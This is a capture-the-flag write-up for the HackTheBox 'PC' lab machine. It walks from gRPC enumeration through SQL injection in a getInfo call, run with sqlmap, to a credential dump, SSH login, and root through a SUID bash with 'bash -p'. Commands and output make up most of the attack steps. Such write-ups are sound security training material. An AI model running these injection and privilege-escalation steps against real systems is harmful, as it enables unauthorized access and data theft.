---
title: PC (HTB) / Easy
image: /assets/writeups/ANIME _ JUJUTSU KAISEN.jpeg
description: Write-up of PC Machine (HackTheBox * Hacker's Wrath) 
date: 2023-06-02 
categories: [hackthebox]
tags: [hackthebox, htb, writeup, easy, machine, linux, sql-injection, grpc, suid]
author: trace
---

## Machine Information

---

- Alias: PC
- Date: 21 May 2023
- Platform: Linux
- Difficulty: Easy
- Tags: #htb #linux #grpc #sqli #SUID 
- Status: Active
- IP: 10.10.11.214

---

## Resolution Summary

1. Scanning for open ports, the attacker found a service running at 50051.
2. Searching for it, he discovers about the gRPC system.
3. Playing around with the functions using `gRPCui`, the attacker find a SQLI vulnerable route (`getInfo`) and exploits it with `sqlmap`.
4. The attacker find credentials for a user, `sau`.
5. After enumerating the SUID binaries, the attacker discovers that bash is misconfigured.
6. The attacker exploits the bash binary with the `bash -p` command. 

## Tools

| Purpose                        | Tools                                                                                                                                                                                                                                  |
|:------------------------------ |:-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Port Scanning/Service Analysis | [`nmap`](https://nmap.org/) [`nc`](https://www.armourinfosec.com/hacking-with-netcat-a-comprehensive-guide/)                                                                                                                           |
| gRPC Communication             | [`grpcurl`](https://github.com/fullstorydev/grpcurl) [`grpcui`](https://github.com/fullstorydev/grpcui) [`postman`](https://blog.postman.com/postman-now-supports-grpc/) [`burpsuite`](https://portswigger.net/burp/communitydownload) |
| SQL Injection                  | [`sqlmap`](https://sqlmap.org/)                                                                                                                                                                                                        |
| SUID Exploitation              | [`GTFOBins`](https://gtfobins.github.io/)                                                                                                                                                                                              |

## Information Gathering

#### Port Scanning

Let's start this box running a SYN scan in all ports:

```bash
$ nmap -sS -p- -oN nmap.txt 10.10.11.214
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown
```

Two services: `ssh` and a... what?

## Enumeration

#### unknown (50051)

Connecting to the port, we receive the following data:

```bash
$ nc -vvx 10.10.11.214 50051 
pc.htb [10.10.11.214] 50051 open
???Received 46 bytes from the socket
00000000  00 00 18 04  00 00 00 00  00 00 04 00  3F FF FF 00  ............?...
00000010  05 00 3F FF  FF 00 06 00  00 20 00 FE  03 00 00 00  ..?...... ......
00000020  01 00 00 04  08 00 00 00  00 00 00 3F  00 00        ...........?..
```

Wait... What kind of data is that? It appears to be a binary file, and no matter what I send through the server, the connection is closed. While searching for potential services running on port 50051, we came across a system known as gRPC, which is an acronym for [Google Remote Procedure Call](https://grpc.io/).

#### gRPC (50051)

##### What on earth is gRPC?

Running functions in the server as if they were local, essentially. The gRPC is a framework from Google focused on high-performance, operating over HTTP 2 (this justifies the binary data seen before). It's similar to a common API. 

One of the most common configurations is the [Unary RPC](https://grpc.io/docs/what-is-grpc/core-concepts/#unary-rpc), which works in the request-response synchronous model. As we'll see down below, this is the setup for this machine.

##### How can I interact with it?

There a bunch of tools to request the gRPC. A great swiss-knife it's [`grpcurl`](https://github.com/fullstorydev/grpcurl): 

```bash
grpcurl -plaintext <HOST>:<PORT> list  # List all services available
grpcurl -plaintext <HOST>:<PORT> describe <SERVICE>  # See all functions from a service
grpcurl -plaintext <HOST>:<PORT> describe <MESSAGE>  # See a message (parameters) from a function 
grpcurl -plaintext -d '{"key":"value", ...}' <HOST>:<PORT> <SERVICE>.<FUNCTION>  # Send data (POST request) to a function 
```

Although, there's a more user-friendly tool, [`grpcui`](https://github.com/fullstorydev/grpcui), which is an interactive web UI that will facilitate our work from here.

Also, the Postman API platform has full support for gRPC. Make sure to [check it out](https://blog.postman.com/postman-now-supports-grpc/).

##### gRPCui

Download the project from [github](https://github.com/fullstorydev/grpcui) and run it:

```bash
$ grpcui -plaintext 10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:36409/
```

Accessing the Web UI:

This machine has two services: `SimpleApp` and `grpc.reflection.v1alpha.ServerReflection`. The `ServerReflection` is used to [expose the other services publicly](https://grpc.github.io/grpc/core/md_doc_server_reflection_tutorial.html).

While exploring the server, we discovered three functions within SimpleApp: one for login, one for registration, and another one to retrieve user information. Once authenticated, the user receives a token metadata attribute containing a JWT, which is used for the getInfo function.

| Function     | Message (Parameters)                         | JWT Required | Message                                                     |
|:------------ |:-------------------------------------------- |:------------ |:----------------------------------------------------------- |
| LoginUser    | `{"username":"USER", "password":"PASSWORD"}` | `False`      | "Your id is 345.", "Login unsuccessful"                     |
| RegisterUser | `{"username":"USER", "password":"PASSWORD"}` | `False`      | "Account created for user arthur!", "User Already Exists!!" |
| getInfo      | `{"id": "USER_ID"}`                          | `True`       | "Will update soon."                                         |



<!--
Calling the `getInfo` with our id as payload. we got a message:
<img src="/assets/writeups/2023-06-02-pc/getInfo.png" width=500px alt="Sample message">
-->

It is possible that when we call the `getInfo` function, the returned message is retrieved from a database. This opens up the possibility of trying to inject SQL code into the `id` field.

Said and done, we encountered a Python error:



## Exploitation

To exploit this vulnerability, let's use sqlmap. 

1. Save the vulnerable request and replace the `'` with a wildcard `*`.

```
# req.txt
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:45793
// [Headers goes here] // 

{"metadata":[{"name":"token","value":"INSERT-VALID-TOKEN-HERE"}],"data":[{"id":"*"}]}
```

Running sqlmap:

```bash
sqlmap -r req.txt --risk 3 --level 5
```

The scan detects that the database is [SQLite3](https://www.sqlite.org/index.html) and dumps it. Since it's a serverless database, we can't find any information about the system. The database consists of two tables: messages and accounts.

If you want to gain a deeper understanding of injecting in SQLite3, make sure to check out [this paper](https://www.exploit-db.com/docs/41397).

```
Table: messages
[1 entry]
+----+----------------------------------------------+----------+
| id | message                                      | username |
+----+----------------------------------------------+----------+
| 1  | The admin is working hard to fix the issues. | admin    |
+----+----------------------------------------------+----------+

Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+
```

Trying to login via SSH with the `sau` user, we get a shell. 

## Privilege Escalation

#### Local Enumeration (sau)

Enumerating system's information:

---

- id: `uid=1001(sau) gid=1001(sau) groups=1001(sau)`
- system: `Ubuntu 20.04.6 LTS`
- users: `sau`, `root`.
- kernel: `Linux pc 5.4.0-148-generic #165-Ubuntu x86_64 GNU/Linux`
- sudo enabled: `yes, but not for sau.`

---

One of the most common privilege escalation techniques is through [SUID](https://medium.com/go-cyber/linux-privilege-escalation-with-suid-files-6119d73bc620). Let's test it out and see how it works:

#### Checking for SUID binaries

```bash
$ find / -user root -perm /4000 2>/dev/null 
# [...]
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/bash
/usr/bin/mount
/usr/bin/chsh
# [...]
```

The `bash` binary is set with the SUID bit. In simple words, this means that when executing bash, it runs with the owner's privileges, which in this case is root. To exploit this configuration, we can spawn a new shell [while maintaining the root privileges](https://gtfobins.github.io/gtfobins/bash/#suid).

```bash
$ bash -p
# whoami
root
```

Thank you for reading!
